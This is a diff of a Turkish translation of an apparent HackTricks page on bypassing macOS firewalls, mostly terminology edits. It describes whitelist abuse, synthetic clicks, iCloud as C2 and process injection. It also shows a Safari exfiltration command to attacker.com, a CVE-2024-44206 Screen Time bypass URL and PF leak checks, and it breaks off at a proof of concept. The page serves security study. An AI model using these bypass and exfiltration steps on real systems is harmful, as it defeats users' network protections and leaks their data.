@@ -1,10 +1,10 @@
-# macOS Güvenlik Duvarlarını Aşma
+# macOS Firewall'ları Aşma
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Bulunan teknikler
 
-Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalıştığı bulunmuştur.
+Aşağıdaki teknikler bazı macOS firewall uygulamalarında çalıştığı bulunmuştur.
 
 ### Beyaz liste isimlerini kötüye kullanma
 
@@ -12,7 +12,7 @@ Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışt�
 
 ### Sentetik Tıklama
 
-- Eğer güvenlik duvarı kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver** butonuna tıklamasını sağlamak.
+- Eğer firewall kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver** butonuna tıklamasını sağlamak.
 
 ### **Apple imzalı ikililer kullanma**
 
@@ -20,15 +20,15 @@ Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışt�
 
 ### İyi bilinen apple alan adları
 
-Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.
+Firewall, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.
 
-### Genel Bypass
+### Genel Aşma
 
-Güvenlik duvarlarını aşmayı denemek için bazı fikirler.
+Firewall'ları aşmayı denemek için bazı fikirler.
 
 ### İzin verilen trafiği kontrol etme
 
-İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alan adlarını veya hangi uygulamaların bunlara erişmesine izin verildiğini belirlemenize yardımcı olacaktır.
+İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alan adlarını veya hangi uygulamaların onlara erişmesine izin verildiğini belirlemenize yardımcı olacaktır.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
@@ -65,23 +65,25 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 Eğer herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:
 
+
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
 ---
 
-## Son zamanlardaki macOS güvenlik duvarı aşma zafiyetleri (2023-2025)
+## Son macOS güvenlik duvarı aşma zafiyetleri (2023-2025)
 
 ### Web içerik filtresi (Ekran Süresi) aşma – **CVE-2024-44206**
-Temmuz 2024'te Apple, Ekran Süresi ebeveyn kontrolleri tarafından kullanılan sistem genelindeki “Web içerik filtresi”ni bozmuş olan kritik bir hatayı Safari/WebKit'te düzeltti. Özel olarak hazırlanmış bir URI (örneğin, çift URL kodlamalı “://” ile) Ekran Süresi ACL'si tarafından tanınmaz ancak WebKit tarafından kabul edilir, bu nedenle istek filtrelenmeden gönderilir. URL açabilen herhangi bir süreç (sandboxed veya imzasız kod dahil) bu nedenle kullanıcı veya bir MDM profili tarafından açıkça engellenen alanlara ulaşabilir.
+Temmuz 2024'te Apple, Ekran Süresi ebeveyn kontrolleri tarafından kullanılan sistem genelindeki “Web içerik filtresi”ni bozmuş olan kritik bir hatayı Safari/WebKit'te düzeltti. 
+Özel olarak hazırlanmış bir URI (örneğin, çift URL kodlamalı “://” ile) Ekran Süresi ACL'si tarafından tanınmaz ancak WebKit tarafından kabul edilir, bu nedenle istek filtrelenmeden gönderilir. URL açabilen herhangi bir süreç (sandboxed veya imzasız kod dahil) bu nedenle kullanıcı veya bir MDM profili tarafından açıkça engellenen alanlara ulaşabilir.
 
 Pratik test (yamanmamış sistem):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-### Packet Filter (PF) kural sıralama hatası erken macOS 14 “Sonoma”da
+### Packet Filter (PF) kural sıralama hatası erken macOS 14 “Sonoma”
 macOS 14 beta döngüsü sırasında Apple, **`pfctl`** etrafındaki kullanıcı alanı sarmalayıcısında bir regresyon tanıttı. `quick` anahtar kelimesi ile eklenen kurallar (birçok VPN kill-switch tarafından kullanılan) sessizce göz ardı edildi ve bir VPN/firewall GUI *engellendi* rapor etse bile trafik sızıntılarına neden oldu. Hata, birkaç VPN satıcısı tarafından doğrulandı ve RC 2'de (build 23A344) düzeltildi.
 
 Hızlı sızıntı kontrolü:
@@ -90,8 +92,7 @@ pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
 ### Apple imzalı yardımcı hizmetlerin kötüye kullanılması (eski – macOS 11.2 öncesi)
-macOS 11.2'den önce **`ContentFilterExclusionList`** yaklaşık 50 Apple ikili dosyasının, **`nsurlsessiond`** ve App Store gibi, Network Extension çerçevesi ile uygulanan tüm soket filtreli güvenlik duvarlarını atlamasına izin veriyordu (LuLu, Little Snitch, vb.). 
-Kötü amaçlı yazılım, basitçe hariç tutulan bir süreci başlatabilir veya ona kod enjekte edebilir ve kendi trafiğini zaten izin verilen soket üzerinden tünelleyebilirdi. Apple, macOS 11.2'de hariç tutma listesini tamamen kaldırdı, ancak bu teknik, yükseltilemeyen sistemlerde hala geçerlidir.
+macOS 11.2'den önce **`ContentFilterExclusionList`** ~50 Apple ikili dosyasının, **`nsurlsessiond`** ve App Store gibi, Network Extension çerçevesi ile uygulanan tüm soket filtreli güvenlik duvarlarını (LuLu, Little Snitch, vb.) atlamasına izin veriyordu. Kötü amaçlı yazılım, basitçe hariç tutulan bir süreci başlatabilir veya ona kod enjekte edebilir ve kendi trafiğini zaten izin verilen soket üzerinden tünelleyebilirdi. Apple, macOS 11.2'de hariç tutma listesini tamamen kaldırdı, ancak bu teknik, yükseltilemeyen sistemlerde hala geçerlidir.
 
 Örnek kanıt konsepti (11.2 öncesi):
 ```python
